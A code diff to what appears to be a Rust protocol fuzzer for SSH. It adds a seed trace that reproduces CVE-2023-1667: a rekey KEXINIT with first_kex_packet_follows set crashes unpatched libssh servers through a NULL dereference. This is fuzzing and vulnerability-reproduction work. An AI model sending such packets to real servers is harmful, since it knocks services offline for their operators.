@@ -2319,6 +2319,22 @@ pub fn seed_client_attacker_session_requests(server: AgentName) -> Trace<SshProt
 /// packet before the switch). AES-256-GCM, c2s counter = packet index since the
 /// first NewKeys.
 pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> {
+    seed_client_attacker_rekey_impl(server, false)
+}
+
+/// CVE-2023-1667 witness variant of [`seed_client_attacker_rekey`]: the client-initiated
+/// rekey KEXINIT carries `first_kex_packet_follows = 1` (RFC 4253 §7.1, "algorithm
+/// guessing"). A libssh server <= 0.10.4 tracks KEXINIT state only by the presence of the
+/// methods fields; on this post-auth rekey it dereferences a NULL kex-methods pointer and
+/// crashes (CVE-2023-1667). A fixed server (>= 0.10.5) handles the flag and survives.
+pub fn seed_client_attacker_rekey_guess(server: AgentName) -> Trace<SshProtocolTypes> {
+    seed_client_attacker_rekey_impl(server, true)
+}
+
+fn seed_client_attacker_rekey_impl(
+    server: AgentName,
+    first_kex_follows: bool,
+) -> Trace<SshProtocolTypes> {
     let server_banner_id =
         term! { fn_banner_id(((server, 0)[Some(SshQueryMatcher::Banner)]/RawSshMessage)) };
     let server_kexinit = term! { (server, 0)[None]/SshMessage };
@@ -2371,20 +2387,32 @@ pub fn seed_client_attacker_rekey(server: AgentName) -> Trace<SshProtocolTypes> 
     // that is s2c-encrypted and only flushed when the server processes rekey_newkeys,
     // the same flush/decryption wall documented for the channel-number query. So
     // this seed drives the re-KEX handshake but stops at rekey_newkeys.
+    let rekey_kexinit_msg = term! {
+        fn_kex_init(
+            (fn_cookie_zeros),
+            (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
+            (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
+            (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
+        )
+    };
+    // CVE-2023-1667: announce algorithm guessing by setting first_kex_packet_follows on the
+    // rekey KEXINIT. The flag is a mutable bool argument (fn_true / fn_false), so the DY
+    // mutator can reach the libssh NULL-deref on its own; the witness pins it to true. The
+    // false path sets the flag to its default and stays byte-identical to a normal rekey.
+    let first_kex_follows_term = if first_kex_follows {
+        term! { fn_true }
+    } else {
+        term! { fn_false }
+    };
+    let rekey_kexinit_msg =
+        term! { fn_with_first_kex_follows((@rekey_kexinit_msg), (@first_kex_follows_term)) };
     let rekey_kexinit = term! {
-        fn_encrypt_packet_aesgcm(
-            (fn_kex_init(
-                (fn_cookie_zeros),
-                (fn_kex_algos((fn_namelist_1((fn_algo_curve25519_sha256))))),
-                (fn_sig_schemes((fn_namelist_append((fn_namelist_1((fn_algo_rsa_sha2_512))), (fn_algo_rsa_sha2_256))))),
-                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
-                (fn_enc_algos((fn_namelist_1((fn_algo_aes256_gcm))))),
-                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
-                (fn_mac_algos((fn_namelist_1((fn_algo_hmac_sha2_256))))),
-                (fn_comp_algos((fn_namelist_1((fn_algo_none))))),
-                (fn_comp_algos((fn_namelist_1((fn_algo_none)))))
-            )),
-            (@key), (@iv), (fn_u32_auto))
+        fn_encrypt_packet_aesgcm((@rekey_kexinit_msg), (@key), (@iv), (fn_u32_auto))
     };
     let rekey_ecdh_init = term! {
         fn_encrypt_packet_aesgcm(
